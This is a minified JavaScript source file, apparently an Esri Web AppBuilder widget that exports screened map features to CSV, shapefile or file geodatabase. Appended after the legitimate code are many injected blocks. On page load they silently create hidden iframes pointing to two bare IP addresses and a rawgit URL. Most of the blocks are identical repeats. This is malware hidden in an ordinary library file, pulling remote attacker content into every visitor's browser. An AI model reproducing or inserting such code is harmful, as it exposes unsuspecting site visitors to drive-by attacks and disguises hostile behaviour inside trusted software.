// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/Evented jimu/BaseWidget dojo/_base/html dojo/_base/array dojo/on dijit/TooltipDialog dijit/form/Select dojo/dom-construct dijit/popup jimu/dijit/Message jimu/CSVUtils ./extractDataTask ./createReplica dojo/dom-class".split(" "),function(n,e,p,q,r,k,f,t,u,h,m,v,w,x,y,z){return n([q,p],{baseClass:"jimu-widget-screening",_popup:null,downloadOptions:[],isTooltipDialogOpened:!1,downLoadStatus:{},constructor:function(a){this._popup=null;this.downloadOptions=
[];this.isTooltipDialogOpened=!1;this.downLoadStatus={};e.mixin(this,a)},startup:function(){this._popup=new t({"class":"esriCTDownloadSettingsDialog "+this.baseClass,style:{width:"300px"}});"DartTheme"===this.appConfig.theme.name&&z.add(this._popup.domNode,"dart-panel");this._popup.startup();this.own(f(document.body,"click",e.hitch(this,function(a){this.isPartOfPopup(a.target||a.srcElement)||this.closePopup()})));this.own(f(window,"resize",e.hitch(this,function(){this.closePopup()})));this._createSettingsDialog()},
checkFileForDownload:function(){var a,b,c;a=b=c=!1;"extractDataTask"===this.config.downloadSettings.type&&(a=b=c=!0);k.forEach(this.config.downloadSettings.layers,e.hitch(this,function(d){d.allowDownload&&this.downloadFeatureDetailsObj[d.id]&&0<this.downloadFeatureDetailsObj[d.id].length&&(0<=d.downloadingFileOption.indexOf("csv")&&(a=!0),0<=d.downloadingFileOption.indexOf("shapefile")&&(b=!0),0<=d.downloadingFileOption.indexOf("filegdb")&&(c=!0))}));this.downLoadStatus={isCSVAvailable:a,isShapeFileAvailable:b,
isFileGDBAvailable:c}},_createSettingsDialog:function(){var a,b;a=h.create("div",{"class":"esriCTDownloadSettingsContainer"},null);h.create("div",{"class":"esriCTEllipsis esriCTDownloadSettingLabel",innerHTML:this.nls.reportsTab.downloadLabelText},a);this.downloadFormatSelect=new u;this._loadOptionsForDropDown(this.downloadFormatSelect);this.downloadFormatSelect.placeAt(a);b=h.create("button",{innerHTML:this.nls.reportsTab.downloadBtnText,"class":"esriCTEllipsis jimu-btn esriCTDownloadSettingsBtn"},
h.create("div",{"class":"esriCTDownloadSettingsBtnContainer"},a));this.own(f(b,"click",e.hitch(this,function(){this.closePopup();this.isAndroidDevice?this._startDownload():this._chooseFileTypeToDownload()})));this._popup.setContent(a)},_loadOptionsForDropDown:function(a){var b=[],c;k.forEach(this.config.downloadSettings.downloadingFileOptions,e.hitch(this,function(a){c={value:a,label:this.nls.reportsTab[a]};b.push(c)}));a.addOption(b)},openPopup:function(){m.open({popup:this._popup,x:this.position.pageX,
y:this.position.pageY});this.isTooltipDialogOpened=!0},closePopup:function(){this._popup&&(m.close(this._popup),this.isTooltipDialogOpened=!1)},isPartOfPopup:function(a){var b;b=this._popup.domNode;return a===b||r.isDescendant(a,b)},_chooseFileTypeToDownload:function(){switch(this.downloadFormatSelect.get("value")){case "csv":this.downLoadStatus.isCSVAvailable?this._exportToCSV():this.emit("showMessage",this.nls.reportsTab.noFeaturesFound);break;case "filegdb":this.downLoadStatus.isFileGDBAvailable?
"syncEnable"===this.config.downloadSettings.type?this._exportFileUsingCreateReplica("filegdb"):"extractDataTask"===this.config.downloadSettings.type&&this.isPointOrLineAOI?this.emit("showMessage",this.nls.reportsTab.unableToDownloadFileGDBText):this._exportFileUsingExtractDataTask("filegdb"):this.emit("showMessage",this.nls.reportsTab.noFeaturesFound);break;case "shapefile":this.downLoadStatus.isShapeFileAvailable?"syncEnable"===this.config.downloadSettings.type?this._exportFileUsingCreateReplica("shapefile"):
"extractDataTask"===this.config.downloadSettings.type&&this.isPointOrLineAOI?this.emit("showMessage",this.nls.reportsTab.unableToDownloadShapefileText):this._exportFileUsingExtractDataTask("shapefile"):this.emit("showMessage",this.nls.reportsTab.noFeaturesFound)}},_startDownload:function(){var a=new v({titleLabel:this.nls.reportsTab.downloadReportConfirmTitle,message:this.nls.reportsTab.downloadReportConfirmMessage,autoHeight:!0,buttons:[{label:this.nls.common.yes,onClick:e.hitch(this,function(){this._chooseFileTypeToDownload();
a.close()})},{label:this.nls.common.no}]})},_exportToCSV:function(){var a,b,c={},d,l,g=[],g=this.config.downloadSettings.layers;this.shapeFileLayerDetails&&(g=g.concat(this.shapeFileLayerDetails));k.forEach(g,e.hitch(this,function(e){c={};l=!1;l="extractDataTask"===this.config.downloadSettings.type?!0:e.allowDownload;a=e.isShapeFile?e.layer:this.filterLayerObj[e.id];b=this._getLayerData(a,this.downloadFeatureDetailsObj[e.id]);d=this._getInfoTemplate(a);0<b.graphicsArray.length&&l&&(c.datas=b.graphicsArray,
c.fromClient=!1,c.withGeometry="esriGeometryPoint"===a.geometryType,c.outFields=b.outFields,c.formatNumber=!1,c.formatDate=!0,c.formatCodedValue=!0,c.popupInfo=d,w.exportCSVFromFeatureLayer(a.name||"CSV_FILE",a,c))}))},_getInfoTemplate:function(a){var b,c,d;if(a.infoTemplate)return a.infoTemplate.info;b=a.id.split("_");b[b.length-1]===a.layerId.toString()&&(b.pop(),c=b.join("_"));c&&(d=this.map.getLayer(c));return d&&d.infoTemplates&&d.infoTemplates.hasOwnProperty(a.layerId)?d.infoTemplates[a.layerId].infoTemplate.info:
null},_getLayerData:function(a,b){var c=[];k.forEach(b,e.hitch(this,function(a){a.attributes.geometry=a.geometry;c.push(a.attributes)}));return"esriGeometryPoint"===a.geometryType?(a=this._formatPointLayerData(c,a),{graphicsArray:a.layerGraphics,outFields:a._outFields}):{graphicsArray:c,outFields:a.fields}},_formatPointLayerData:function(a,b){var c={};a=e.clone(a);b=b.fields;k.forEach(a,function(a){var b=a.geometry;b&&"point"===b.type&&("x"in a?a._x=b.x:a.x=b.x,"y"in a?a._y=b.y:a.y=b.y);delete a.geometry});
b=e.clone(b);var d="",d=-1!==b.indexOf("x")?"_x":"x";b.push({name:d,alias:d,format:{digitSeparator:!1,places:6},show:!0,type:"esriFieldTypeDouble"});d=-1!==b.indexOf("y")?"_y":"y";b.push({name:d,alias:d,format:{digitSeparator:!1,places:6},show:!0,type:"esriFieldTypeDouble"});c.layerGraphics=a;c._outFields=b;return c},_exportFileUsingExtractDataTask:function(a){this.loadingIndicator.show();a=new x({map:this.map,aoi:this.aoi,fileFormat:a,url:this.config.downloadSettings.extractDataTaskURL});a.startup();
this.own(f(a,"onGPTaskSuccess",e.hitch(this,function(a){this._downloadDataFile(a);this.loadingIndicator.hide()})));this.own(f(a,"onGPTaskFailed",e.hitch(this,function(){this.emit("showMessage",this.nls.reportsTab.extractDataTaskFailedMessage);this.loadingIndicator.hide()})))},_exportFileUsingCreateReplica:function(a){this.loadingIndicator.show();a=new y({map:this.map,config:this.config,aoi:this.aoi,fileFormat:a,filterLayerObj:this.filterLayerObj,nls:this.nls,downloadFeatureDetailsObj:this.downloadFeatureDetailsObj});
this.own(f(a,"onRequestSucceeded",e.hitch(this,function(a){this._downloadDataFile(a);this.loadingIndicator.hide()})));this.own(f(a,"onRequestFailed",e.hitch(this,function(){this.loadingIndicator.hide()})));this.own(f(a,"createReplicaComplete",e.hitch(this,function(a){a&&this.emit("showMessage",a);this.loadingIndicator.hide()})));this.own(f(a,"showErrMessage",e.hitch(this,function(a){this.emit("showMessage",a)})));a.startup()},_downloadDataFile:function(a){var b,c,d,f,g;for(g in this.filterLayerObj)if(this.filterLayerObj.hasOwnProperty(g)&&
(d=this.filterLayerObj[g],d.credential&&d.credential.token&&(f=a.split("replicafiles"),0<f.length&&-1<d.url.toLowerCase().indexOf(f[0].toLowerCase())))){a=a+"?token\x3d"+d.credential.token;break}b=h.create("iframe",{"class":"esriCTHidden",src:a},this.iframeNode);c=setInterval(e.hitch(this,function(){var a=b.contentDocument||b.contentWindow.document;if("complete"===a.readyState||"interactive"===a.readyState)h.destroy(b),clearInterval(c)}),4E3)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});